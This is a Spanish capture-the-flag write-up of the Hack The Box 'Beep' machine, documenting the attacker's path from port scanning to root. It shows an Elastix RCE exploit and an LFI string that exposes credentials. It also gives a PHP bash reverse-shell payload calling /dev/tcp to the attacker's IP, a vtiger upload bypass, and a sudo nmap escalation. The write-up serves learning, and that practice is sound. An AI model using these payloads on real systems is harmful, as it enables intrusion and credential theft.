---
title: "Beep - Hack The Box"
date: 2023-02-15
draft: false
slug: "htb-writeup-beep"
excerpt: "Esta máquina es relativamente fácil, pues hay bastantes maneras de poder vulnerarla. Lo que haremos, será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado, pues la página web que esta activa en el puerto 443, tiene ya expirado su certificado SSL. Una vez dentro, usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit usado."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Elastix", "vtiger CRM", "Remote Code Execution (RCE)", "CVE-2012-4869 (RCE)", "Local File Inclusion (LFI)", "Elastix 2.2.0 - 'graph.php' (LFI)", "Information Leakage", "Remote Code Execution - Authenticated (RCE - Authenticated)", "CVE-2009-3250 (RCE - Authenticated)", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "searchsploit"
  - "svwar"
  - "nc"
  - "burpsuite"
  - "sudo"
  - "chmod"
  - "bash"
links:
  - "https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express"
  - "https://www.exploit-db.com/exploits/18650"
  - "https://github.com/OJ/gobuster/issues/129"
  - "https://www.kali.org/tools/sipvicious/"
  - "https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution"
  - "https://gtfobins.github.io/"
  - "https://byte-mind.net/sipvicious-utilidad-de-auditoria-para-sistemas-voip/"
  - "https://products.containerize.com/es/transactional-email/cyrus-imap/"
  - "https://www.3cx.es/voip-sip/ip-pbx-overview/"
  - "https://www.dommia.com/es/faqs/que-es-el-pop3"
  - "https://support.microsoft.com/es-es/office/-qu%C3%A9-son-imap-y-pop-ca2c5799-49f9-4079-aefe-ddca85d5b1c9"
  - "https://www.masip.es/blog/que-es-asterisk/"
  - "https://www.masip.es/blog/asterisk-o-freepbx-para-que-sirven-y-en-que-se-diferencian/"
  - "https://www.cisco.com/c/es_mx/solutions/small-business/resource-center/collaboration/what-is-a-pbx.html#~what-can-a-pbx-do"
  - "https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html"
  - "https://www.exploit-db.com/exploits/9450"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-beep/beep_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está conectada y vamos a analizar el TTL para saber que SO tiene dicha máquina.
```bash
ping -c 4 10.10.10.7 
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=137 ms
64 bytes from 10.10.10.7: icmp_seq=2 ttl=63 time=138 ms
64 bytes from 10.10.10.7: icmp_seq=3 ttl=63 time=136 ms
64 bytes from 10.10.10.7: icmp_seq=4 ttl=63 time=140 ms

--- 10.10.10.7 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3025ms
rtt min/avg/max/mdev = 135.993/137.635/139.741/1.376 ms
```
Estamos contra una máquina con Linux, interesante. Ahora vamos a realizar los escaneos.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:51 CST
Initiating SYN Stealth Scan at 20:51
Scanning 10.10.10.7 [65535 ports]
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 4559/tcp on 10.10.10.7
Discovered open port 793/tcp on 10.10.10.7
Discovered open port 4445/tcp on 10.10.10.7
Discovered open port 4190/tcp on 10.10.10.7
Discovered open port 10000/tcp on 10.10.10.7
Discovered open port 5038/tcp on 10.10.10.7
Completed SYN Stealth Scan at 20:52, 24.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.7
Host is up, received user-set (0.18s latency).
Scanned at 2023-02-15 20:51:30 CST for 38s
Not shown: 64884 closed tcp ports (reset), 635 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 63
25/tcp    open  smtp             syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
110/tcp   open  pop3             syn-ack ttl 63
111/tcp   open  rpcbind          syn-ack ttl 63
143/tcp   open  imap             syn-ack ttl 63
443/tcp   open  https            syn-ack ttl 63
793/tcp   open  unknown          syn-ack ttl 63
993/tcp   open  imaps            syn-ack ttl 63
995/tcp   open  pop3s            syn-ack ttl 63
3306/tcp  open  mysql            syn-ack ttl 63
4190/tcp  open  sieve            syn-ack ttl 63
4445/tcp  open  upnotifyp        syn-ack ttl 63
4559/tcp  open  hylafax          syn-ack ttl 63
5038/tcp  open  unknown          syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.23 seconds
           Raw packets sent: 118826 (5.228MB) | Rcvd: 78868 (3.155MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay muchos puertos abiertos, tenemos bastantillo que investigar.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,25,80,110,111,143,443,793,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:55 CST
Stats: 0:03:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.00% done; ETC: 20:59 (0:00:04 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.072s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 4.3 (protocol 2.0)

| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open  smtp              Postfix smtpd

|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http              Apache httpd 2.2.3

|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3              Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4

|_pop3-capabilities: TOP APOP RESP-CODES UIDL PIPELINING LOGIN-DELAY(0) USER EXPIRE(NEVER) AUTH-RESP-CODE STLS IMPLEMENTATION(Cyrus POP3 server v2)
111/tcp   open  rpcbind           2 (RPC #100000)

| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp   open  imap              Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4

|_imap-capabilities: NO UNSELECT QUOTA RIGHTS=kxte OK ANNOTATEMORE CHILDREN THREAD=REFERENCES URLAUTHA0001 X-NETSCAPE ATOMIC ID IMAP4rev1 LISTEXT UIDPLUS ACL MAILBOX-REFERRALS LIST-SUBSCRIBED CATENATE NAMESPACE IDLE SORT THREAD=ORDEREDSUBJECT SORT=MODSEQ LITERAL+ CONDSTORE IMAP4 BINARY Completed MULTIAPPEND STARTTLS RENAME
443/tcp   open  ssl/http          Apache httpd 2.2.3 ((CentOS))

| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2024-04-03T06:12:27+00:00; -2m04s from scanner time.
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
793/tcp   open  status            1 (RPC #100024)
993/tcp   open  ssl/imap          Cyrus imapd

|_imap-capabilities: CAPABILITY
995/tcp   open  pop3              Cyrus pop3d
3306/tcp  open  mysql             MySQL (unauthorized)
4190/tcp  open  sieve             Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax           HylaFAX 4.3.10
5038/tcp  open  asterisk          Asterisk Call Manager 1.1
10000/tcp open  snet-sensor-mgmt?
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:

|_clock-skew: -2m04s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 397.19 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Ok, para empezar, no tenemos ninguna credencial para el **servicio SSH** por lo que es el primero que descartamos, podríamos iniciar viendo que es ese **servicio Postfix smtpd** y después la página web del **servicio HTTP**. De ahí en adelante, también podríamos investigar el **servicio Cyrus pop3d**.

### Investigación de Servicios {#Investigacion}

Vamos a iniciar con el **servicio Postfix smtpd**:

| **Servicio Postfix smtpd** |
|:-----------:|
| *Postfix es un agente de transporte de mensajes (MTA) de última generación, también conocido como servidor SMTP, que tiene dos propósitos: Es responsable de transportar mensajes de correo electrónico desde un cliente de correo o agente de usuario de correo (MUA) a un servidor SMTP remoto.* |

Ahora, veamos que es el **protocolo POP3**:

| **Protocolo POP3** |
|:-----------:|
| *POP3 es el protocolo de comunicaciones más extendido para leer correo electrónico y responde a las siglas Post Office Protocol.* |

Veamos que hace el **protocolo IMAP**:

| **Protocolo IMAP** |
|:-----------:|
| *IMAP le permite acceder a su correo electrónico desde cualquier lugar y desde cualquier dispositivo. Cuando lee un mensaje de correo electrónico mediante IMAP, en realidad no lo descarga ni almacena en el equipo; En su lugar, lo está leyendo en el servicio de correo electrónico.* |

Ahora con el **servicio Cyrus**:

| **Servicio Cyrus** |
|:-----------:|
| *Cyrus es un servidor de correo electrónico de código abierto configurable, que ofrece un gran conjunto de opciones para integraciones de terceros. Se recomienda para empresas que ofrecen servicios de correo electrónico a sus clientes.* |

Con esto, tengo entendido que **Cyrus** trabaja en conjunto con los **protocolos POP3 e IMAP**, para ofrecer servicios de correo electronico. Quiero suponer que esto se gestiona con la página web que se esta ejecutando, por lo que veamos de que se trata **Elastix**:

| **Servicio Elastix** |
|:-----------:|
| *Elastix es un software de servidor de comunicaciones unificadas que reúne PBX IP, correo electrónico, mensajería instantánea, fax y funciones colaborativas. Cuenta con una interfaz Web e incluye capacidades como un software de centro de llamadas con marcación predictiva* |

Y si, esto me confirma más que la página web, gestiona todo el servicio de telefonia y correo electronico de esta máquina.

Ya solamente falta ver que es **Asterisk**.

| **Programa Asterisk** |
|:-----------:|
| *Asterisk es un programa de software libre, que permite a los usuarios utilizar, copiar, estudiar, compartir y modificar el software, e incluso publicar las mejoras. Este programa proporciona las funcionalidades de una central telefónica (PBX). Asterisk permite crear sistemas de telefonía IP, Gateways, VoIP, servidores de conferencia y otras soluciones personalizadas.* |

Vemos muchos servicios, protocolos y programas que en mi caso son desconocidas o no había tratado, esta será una buena practica. Pasemos a analizar la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTPS {#Web}

**IMPORTANTE**, tuve problemas para entrar pues salía el error **SSL_ERROR_UNSUPPORTED_VERSION**, el siguiente link explica como resolverlo, echale un ojo: <a href="https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express" target="_blank">SSL_ERROR_UNSUPPORTED_VERSION when attempting to debug with IIS Express</a>

----------

Muy bien, ya estamos dentro:

![](/assets/images/htb-writeup-beep/Captura1.png)

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura2.png">
</p>

Y veamos que nos dice la **herramienta whatweb**:
```bash
whatweb https://10.10.10.7
https://10.10.10.7 [200 OK] Apache[2.2.3], Cookies[elastixSession], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], IP[10.10.10.7], PHP[5.1.6], PasswordField[input_pass], Script[text/javascript], Title[Elastix - Login page], X-Powered-By[PHP/5.1.6]
```

Usan **PHP**, entonces podemos hacer un **Fuzzing** para ver que otras subpáginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
* *eLaStIx*
* *2oo7*

No sirvieron, bueno hagamos el **Fuzzing**.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404,403 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.7/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.7/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000061:   200        9 L      24 W       346 Ch      "help"                                                                                                                                                                    
000000013:   200        34 L     111 W      1785 Ch     "#"                                                                                                                                                                       
000000016:   200        165 L    1549 W     29898 Ch    "images"                                                                                                                                                                  
000000083:   200        176 L    1665 W     31006 Ch    "icons"                                                                                                                                                                   
000000014:   200        34 L     111 W      1785 Ch     "https://10.10.10.7//"                                                                                                                                                    
000000127:   200        26 L     189 W      3172 Ch     "themes"                                                                                                                                                                  
000000145:   200        78 L     761 W      13132 Ch    "modules"                                                                                                                                                                 
000000269:   200        16 L     73 W       1276 Ch     "static"                                                                                                                                                                  
000000259:   302        0 L      0 W        0 Ch        "admin"                                                                                                                                                                   
000000201:   200        64 L     165 W      2411 Ch     "mail"                                                                                                                                                                    
000000631:   200        13 L     46 W       698 Ch      "pipermail"                                                                                                                                                               
000001198:   200        36 L     256 W      4788 Ch     "lang"                                                                                                                                                                    
000004703:   200        16 L     79 W       1236 Ch     "var"                                                                                                                                                                     
000005520:   200        27 L     74 W       1065 Ch     "panel"
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Vamos a ver que tal se ve  con la herrrammienta **Gobuster**:
```bash
gobuster dir -u https://10.10.10.7/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
19:50:31 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-k*       | Para indicar que se deshabilite la comprobación de certificados |

Hay un directorio que me llama la atención y es el **/admin**, entremos para ver de que se trata:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura3.png">
</p>

Nos piden credenciales que no tenemos de momento y si cancelamos, nos manda un mensaje de no autorizados a **FreePBX**:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura4.png">
</p>

Como de momento, no tenemos ninguna credencial para los logins que hemos encontrado, vamos a buscar un Exploit para el **servicio Elastix**.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando y Probando un Exploit {#Exploit}

```bash
searchsploit elastix      
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Elastix - 'page' Cross-Site Scripting                                                                      | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                    | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                              | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                           | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                          | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                         | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                     | php/webapps/18650.py

|---|---|
Shellcodes: No Results
Papers: No Results
```
Hay varios que me gustaría probar como el **LFI, XSS y PHP Code Injection**, pero creo que sería mejor si probamos con el **RCE**. Vamos a analizar y después los demás.

### Probando Exploit: Elastix 2.2.0 - Remote Code Execution {#PruebaExp}

```bash
searchsploit -x php/webapps/18650.py     
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
```
Parece que este Exploit nos mete directamente usando la URL para inyectar un Payload que será una **Reverse Shell**. Esto ya es automatizado, solamente tendríamos que poner la IP de la máquina, nuestra IP y el puerto al que nos conectara usando una **netcat**.

Vamos a probarlo:
```bash
rhost="10.10.10.7"
lhost="Tu_IP"
lport=443
```
Cambia esos datos y ejecuta el script con **Python2** y...nada, no me conecto a nada y no salió nada en la página. Supongo que es por el problema que tuve antes para poder entrar a la página, pues el **certificado SSL** parece ya no servir, quizá si lo modificamos puede que apruebe el Exploit y sirva, vamos a investigar un poco como podemos modificarlo.

Durante la búsqueda, encontré un **GitHub** que justamente cambia el Exploit para que este opere bien:
* <a href="https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution" target="_blank">Repositorio de infosecjunky: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution</a>

Para modificar el Exploit, se debe buscar una extensión que sirva con el **servicio FreePBX** que está relacionado con el **servicio Elastix** de esta máquina, pero ¿qué es **FreePBX**?

| **Servicio FreePBX** |
|:-----------:|
| *FreePBX es una GUI de código abierto basado en Web que controla y dirige Asterisk. También se incluye como una pieza clave de otras distribuciones como Elastix, Trixbox y AsteriskNOW.* |

Entonces, como el **certificado SSL** ya no sirve, por consiguiente, la extensión del Exploit tampoco (que es la extensión 1000), entonces usaremos otra extensión disponible para poder conectarnos al servidor y que con esto sirva el Exploit.

Para buscar una extensión, es necesario el paquete de herramientas **sipvicious**, de aqui usaremos la herramienta **svwar**, esta herramienta identifica las líneas de extensión en funcionamiento en un **PBX**. También, le dice si la línea de extensión requiere autenticación o no.

Pero, ¿qué es un **PBX**?

| **PBX** |
|:-----------:|
| *Un PBX tradicional se conecta a las líneas de teléfono fijo mediante hardware dedicado, generalmente una consola de enrutamiento. Todas las conexiones son cableadas, lo que crea una red de voz física separada de la red de datos empresarial. Mientras que muchos sistemas PBX tradicionales aún están en uso, se están volviendo obsoletos a medida que aparecen las opciones basadas en la nube con nuevas funciones.* |

Bueno, vamos a encontrar esas lineas de extensión:
```bash
svwar -m INVITE -e100-500 10.10.10.7
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+

| Extension | Authentication |
+===========+================+

| 233       | reqauth        |
+-----------+----------------+
```
Aquí más información sobre la **herramienta sipvicious**:
* <a href="https://byte-mind.net/sipvicious-utilidad-de-auditoria-para-sistemas-voip/" target="_blank">Sipvicious – Utilidad de auditoría para sistemas VoIP</a>

Claro que en este caso ya no es necesario, pues ya hay una extensión que sirve dentro del Exploit modificado en el **GitHub**, lo único que tenemos que hacer es copiar los cambios, ósea, la extension, las 3 líneas de código abajo de la extensión y agregar el **context** al **urlopen**.

Ahora sí, levantamos la **netcat** otra vez:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Corremos el Exploit:
```bash
python2 Exploit_Elastix1.py
```

* Y ya estamos dentro:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.7] 49122
whoami
asterisk
id
uid=100(asterisk) gid=101(asterisk)
```

Con esto, quiero pensar que la versión que es vulnerable es la **Elastix 2.2.0**, entonces, vamos a probar el Exploit que hace un **LFI**.

### Probando Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion {#PruebaExp2}

Copialo en tu directorio de trabajo:
```bash
searchsploit -m php/webapps/37637.pl
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
```

De acuerdo al Exploit, tenemos una forma de aplicar un **Local File Inclusion (LFI)** y poder ver una base de datos que contiene usuarios y contraseñas, esto utilizando la siguiente ruta:
```bash
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Pero, ¿qué es un **LFI**?

| **Local File Inclusion** |
|:-----------:|
| *Las vulnerabilidades LFI (Local File Inclusion o inclusión de archivos locales) son vulnerabilidades que permiten leer cualquier archivo que se encuentre dentro del mismo servidor, incluso si el archivo se encuentra fuera del directorio web donde está alojada la página.* |

Veamos el resultado de aplicarlo en la página web:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura5.png">
</p>

De aquí, podemos sacar mucha información, usuarios y contraseñas de acceso a BD o login, rutas donde estan guardados archivos de configuración, etc. Si quieres ver mejor la información, inspecciona el código de la página web:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura6.png">
</p>

Observa que ahí estan usuarios y contraseñas, vamos a probar algunos de estos para tratar de acceder al login que se nos muestra al entrar en la página:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura7.png">
</p>

Las credenciales son:
* *Usuario: admin*
* *Contraseña: jEhdIekWmdjE*

Si presionamos el botón de admiración, podemos ver mucha información de los servicios operando en el sistema:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura8.png">
</p>

Es una excelente forma de obtener información y como ya vimos, hay algunos Exploits que podemos aplicar a este servicio. 

Pero, hay algo que se nos esta escapando, y es que si analizamos más la ruta para aplicar el **LFI**, veremos que hay un directorio llamado **/vtigercrm**.

#### Probando Exploit: vTiger CRM 5.0.4 - Remote Code Execution y vTiger CRM 5.2.0 - Remote Code Execution {#PruebaExp3}

Vamos a investigarlo para ver que nos puede mostrar:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura9.png">
</p>

Es un login de un nuevo servicio, veamos si las mismas contraseñas funcionan:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura10.png">
</p>

Si funcionan, veamos de que va este servicio y busquemos si hay una forma de vulnerarlo.

| **vtiger CRM** |
|:-----------:|
| *vtiger CRM es una aplicación CRM de código abierto bifurcada con la intención de hacer una herramienta con una funcionalidad similar a SugarCRM y Salesforce.com, pero de código abierto. En su versión gratuita ofrece una herramienta de informes, un portal para clientes y un plugin para Outlook, opciones que se hallan en las versiones de pago de las otras aplicaciones.* |

Investigando un poco, hay una forma subir un archivo malicioso que nos de una **Reverse Shell**:

* <a href="https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html" target="_blank">vtiger CRM 5.2.0 Shell Upload</a>
* <a href="https://www.exploit-db.com/exploits/9450" target="_blank">vTiger CRM 5.0.4 - Remote Code Execution / Cross-Site Request Forgery / Local File Inclusion / Cross-Site Scripting</a>

Aunque esto es para una versión superior (**vtiger CRM 5.2.0**) y también anterior (**vtiger CRM 5.0.4**), vamos a probar si funciona, utilizando ambos como guia. Hagamoslo por pasos:

* Creamos un archivo malicioso en PHP que contenga un Payload de **Reverse Shell**, llamalo **cmd.php** o como quieras:
```php
<?php
        system("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'");
?>
```

* Entramos a la siguiente ruta de la página:
```bash
/vtigercrm/index.php?action=upload&module=uploads
```

* Abrimos burpsuite para capturar esta página:
```bash
burpsuite &> /dev/null & disown
```

* Cargamos el **cmd.php** y lo guardamos, con esto capturaremos el trafico y podremos manipular la petición:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura12.png">
</p>

* Mandamos la petición al **repeater** y en la parte del *filename_hidden*, agregamos al nombre de **cmd.php** un slash inverso y un punto:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura13.png">
</p>

* Enviamos la petición y entramos en la siguiente ruta en la página web: **/storage**. De aquí, entraremos en los directorios que encuentre hasta el que diga **/week**, entra en ese directorio y podras ver nuestra **Reverse Shell**.

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura14.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura15.png">
</p>

Observa que lo intente varias veces...

* Por último, levantamos una **netcat** y ejecutamos la **Reverse Shell**, seleccionandola desde la web:
```bash
nc -nlvp 443
```

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura16.png">
</p>

* Resultado:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.7] 45214
bash: no job control in this shell
bash-3.2$ whoami
asterisk
```
Y listo, volvimos a ganar acceso.

**NOTA**:

Existe otra forma de poder ganar acceso a la máquina, esto a traves del **puerto 10000**, ya sea apicando un **ataque Shellshock** o buscando una manera de subir un archivo malicioso para obtener una shell, puedes intentar hacer esto.

## Post Explotación {#Post}

### Abusando de los Privilegios del Usuario Asterisk, Usando nmap y chmod para Escalar Privilegios {#Privesc}

Bueno, el mismo Exploit nos indica que hacer y es activar la **herramienta nmap** con **SUDO** de forma interactiva, para poder usar **nmap** desde la consola y no como comando, solamente escribimos **!sh** y podremos escalar privilegios para ser **Root**:
```bash
sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```

Ya solo es buscar las flags que la del Root se encuentra en **/root** y la del usuario en **/home**.

Lo que hicimos fue abusar de los privilegios que tiene el usuario **Asterisk** que como ya vimos está ligado al servicio **Elastix**, **FreePBX** y otros. Si recordamos su definición, este usuario tiene ciertos privilegios para poder operar.

Con el comando **sudo -l** podemos ver que permisos como Root tiene dicho usuario **Asterisk**:
```bash
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
